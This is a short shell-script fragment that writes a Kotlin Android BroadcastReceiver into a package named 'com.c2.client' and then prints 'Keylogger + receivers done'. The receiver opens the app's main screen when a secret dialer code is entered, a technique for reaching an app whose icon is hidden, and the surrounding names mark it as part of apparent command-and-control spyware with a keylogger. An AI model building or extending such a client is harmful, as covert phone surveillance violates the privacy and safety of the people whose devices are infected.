cat > app/src/main/java/com/c2/client/SecretCodeReceiver.kt << 'EOF'
package com.c2.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class SecretCodeReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        if (intent?.action != "android.provider.Telephony.SECRET_CODE") return
        try {
            ctx.startActivity(Intent(ctx, MainActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        } catch (_: Exception) {}
    }
}
EOF

echo "═══ Keylogger + receivers done ═══"
